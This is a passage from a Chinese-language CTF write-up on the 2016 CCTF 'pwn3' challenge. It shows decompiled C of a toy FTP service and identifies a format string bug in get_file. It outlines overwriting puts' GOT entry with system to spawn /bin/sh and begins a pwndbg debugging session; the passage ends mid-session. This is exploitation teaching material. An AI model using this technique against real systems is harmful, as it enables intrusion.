</span></span><span class="line"><span class="cl">  <span class="nf">ask_username</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ask_password</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">print_prompt</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">v3</span> <span class="o">=</span> <span class="nf">get_command</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">v5</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">put_file</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">show_dir</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">get_file</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>ask_username():</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="kr">__cdecl</span> <span class="nf">ask_username</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">src</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [esp+14h] [ebp-34h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+3Ch] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Connected to ftp.hacker.server&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;220 Serv-U FTP Server v6.4 for WinSock ready...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name (ftp.hacker.server:Rainism):&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%40s&#34;</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">39</span> <span class="o">&amp;&amp;</span> <span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">++</span><span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">strcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>对输入的每一位进行了+1的操作。</p>
<p>ask_password()</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">ask_password</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;sysbdmin&#34;</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;who you are?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;welcome!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>操作之后的需要与sysbdmin相同。</p>
<p>get_command()</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">get_command</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s1</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%3s&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strncmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;get&#34;</span><span class="p">,</span> <span class="mi">3u</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strncmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;put&#34;</span><span class="p">,</span> <span class="mi">3u</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strncmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;dir&#34;</span><span class="p">,</span> <span class="mi">3u</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>put_file()：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">_DWORD</span> <span class="o">*</span><span class="nf">put_file</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_DWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// ST1C_4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_DWORD</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v0</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0xF4u</span><span class="p">);</span><span class="c1">//244
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;please enter the name of the file you want to upload:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">get_input</span><span class="p">(</span><span class="n">v0</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;then, enter the content:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">get_input</span><span class="p">(</span><span class="n">v0</span> <span class="o">+</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v0</span><span class="p">[</span><span class="mi">60</span><span class="p">]</span> <span class="o">=</span> <span class="n">file_head</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">file_head</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>malloc后调用两次get_input()函数，并在最后的 4 个字节内写入上一块调用 put_file 时获得的地址，然后更新头指针 file_head 并返回本次分配的空间的起始地址。</p>
<p>也就是说，每次调用put_file()，分配244字节大小的空间，前40字节保存文件名，后200保存文件内容，最后四个字节保存上一块内存的地址，file_head是bss段上的变量，所以值为0，这样就在栈上得到一条链。</p>
<p>get_input()</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">signed</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">get_input</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+18h] [ebp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nf">fread</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">a1</span><span class="p">),</span> <span class="mi">1u</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v4</span> <span class="o">==</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">a3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">+</span> <span class="n">a1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="o">++</span><span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&gt;=</span> <span class="n">a2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>函数在遇到回车符号或达到最大输入量（第二个参数）前，会一直向第一个参数指定的缓冲区中写入输入的内容.</p>
<p>show_dir()：函数遍历前面利用 put_file 得到的链栈，并依次将它们的名字复制到大小为 1024 个字节的缓冲区中，然后输出缓冲区的内容</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">show_dir</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span> <span class="c1">// [esp+14h] [ebp-414h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+414h] [ebp-14h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [esp+418h] [ebp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+41Ch] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">bzero</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x400u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">file_head</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">240</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">);</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v0</span> <span class="o">=</span> <span class="n">v5</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">s</span><span class="p">[</span><span class="n">v0</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>get_file()：存在漏洞的函数。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_file</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">dest</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-FCh]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s1</span><span class="p">;</span> <span class="c1">// [esp+E4h] [ebp-34h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+10Ch] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter the file name you want to get:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%40s&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strncmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">,</span> <span class="mi">4u</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;too young, too simple&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">file_head</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">i</span> <span class="o">+</span> <span class="mi">60</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s1</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">40</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nf">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>根据用户输入的文件名到链栈中去寻找，如果有同名的文件那么输出内容，但是因为最后将文件的内容直接 printf 出来，所以存在 <strong>格式化字符串漏洞</strong>。</p>
<p>将文件内容put到文件中后，调用get_file将文件内容读取出来，存在格式化字符串漏洞，可以达到信息泄露和任意地址写。</p>
<ol>
<li>利用格式化字符串的任意写，将show_dir()函数调用的put函数在got.plt表中的地址改为system的地址</li>
<li>将show_dir()所显示的文件名内容设成/bin/sh</li>
</ol>
<p>完成上面两步后，就可以在运行show_dir()时将puts(&quot;/bin/sh&quot;)变为system(&quot;&quot;/bin/sh&quot;)</p>
<p>第二步比较简单，主要是第一步。</p>
<p>不知道system函数的地址，因为我们不知道动态链接后libc的基址，这首先需要将这个信息泄露</p>
<p>我们先在printf的地址下断点</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048895</span> <span class="nl">loc_8048895:</span>                            <span class="c1">; CODE XREF: get_file+8B↑j
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">08048895</span>                 <span class="nf">lea</span>     <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="no">dest</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804889</span><span class="nf">B</span>                 <span class="no">mov</span>     <span class="p">[</span><span class="no">esp</span><span class="p">],</span> <span class="no">eax</span>      <span class="c1">; format
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">0804889</span><span class="nf">E</span>                 <span class="no">call</span>    <span class="no">_printf</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080488</span><span class="nf">A3</span>                 <span class="no">leave</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080488</span><span class="nf">A4</span>                 <span class="no">retn</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080488</span><span class="nf">A4</span> <span class="no">get_file</span>        <span class="no">endp</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yutao</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">fmtstr</span><span class="o">/</span><span class="mi">2016</span><span class="o">-</span><span class="n">CCTF</span><span class="o">-</span><span class="n">pwn3</span><span class="o">/</span><span class="n">pwn3</span> 
</span></span><span class="line"><span class="cl"><span class="n">Connected</span> <span class="n">to</span> <span class="n">ftp</span><span class="p">.</span><span class="n">hacker</span><span class="p">.</span><span class="n">server</span>
</span></span><span class="line"><span class="cl"><span class="mi">220</span> <span class="n">Serv</span><span class="o">-</span><span class="n">U</span> <span class="n">FTP</span> <span class="n">Server</span> <span class="n">v6</span><span class="mf">.4</span> <span class="k">for</span> <span class="n">WinSock</span> <span class="n">ready</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nf">Name</span> <span class="p">(</span><span class="n">ftp</span><span class="p">.</span><span class="n">hacker</span><span class="p">.</span><span class="nl">server</span><span class="p">:</span><span class="n">Rainism</span><span class="p">)</span><span class="o">:</span><span class="n">rxraclhm</span>
</span></span><span class="line"><span class="cl"><span class="n">welcome</span><span class="o">!</span>
</span></span><span class="line"><span class="cl"><span class="n">ftp</span><span class="o">&gt;</span><span class="n">put</span> 
</span></span><span class="line"><span class="cl"><span class="n">please</span> <span class="n">enter</span> <span class="n">the</span> <span class="n">name</span> <span class="n">of</span> <span class="n">the</span> <span class="n">file</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="nl">upload</span><span class="p">:</span><span class="n">namename</span>
</span></span><span class="line"><span class="cl"><span class="n">then</span><span class="p">,</span> <span class="n">enter</span> <span class="n">the</span> <span class="nl">content</span><span class="p">:</span><span class="n">qwerqwer</span>
</span></span><span class="line"><span class="cl"><span class="n">ftp</span><span class="o">&gt;</span><span class="n">get</span>
</span></span><span class="line"><span class="cl"><span class="n">enter</span> <span class="n">the</span> <span class="n">file</span> <span class="n">name</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="nl">get</span><span class="p">:</span><span class="n">namename</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0804889e</span> <span class="n">in</span> <span class="nf">get_file</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nl">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────</span><span class="p">[</span> <span class="n">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────</span>
</span></span><span class="line"><span class="cl"> <span class="n">EAX</span>  <span class="mh">0xffffcedc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"> <span class="n">EBX</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">ECX</span>  <span class="mh">0x804b598</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"> <span class="n">EDX</span>  <span class="mh">0xffffcedc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"> <span class="n">EDI</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">ESI</span>  <span class="mh">0xf7fb6000</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x1d7d8c</span>
</span></span><span class="line"><span class="cl"> <span class="n">EBP</span>  <span class="mh">0xffffcfd8</span> <span class="err">—▸</span> <span class="mh">0xffffd028</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">ESP</span>  <span class="mh">0xffffcec0</span> <span class="err">—▸</span> <span class="mh">0xffffcedc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"> <span class="n">EIP</span>  <span class="mh">0x804889e</span> <span class="p">(</span><span class="n">get_file</span><span class="o">+</span><span class="mi">168</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0xfffc1de8</span> <span class="err">◂—</span> <span class="mh">0xfffc1de8</span>
</span></span><span class="line"><span class="cl"><span class="err">───────────────────────────────────</span><span class="p">[</span> <span class="n">DISASM</span> <span class="p">]</span><span class="err">───────────────────────────────────</span>
</span></span><span class="line"><span class="cl"> <span class="err">►</span> <span class="mh">0x804889e</span> <span class="o">&lt;</span><span class="n">get_file</span><span class="o">+</span><span class="mi">168</span><span class="o">&gt;</span>      <span class="n">call</span>   <span class="n">printf</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nl">format</span><span class="p">:</span> <span class="mh">0xffffcedc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="nl">vararg</span><span class="p">:</span> <span class="mh">0x804b598</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">   <span class="mh">0x80488a3</span> <span class="o">&lt;</span><span class="n">get_file</span><span class="o">+</span><span class="mi">173</span><span class="o">&gt;</span>      <span class="n">leave</span>  
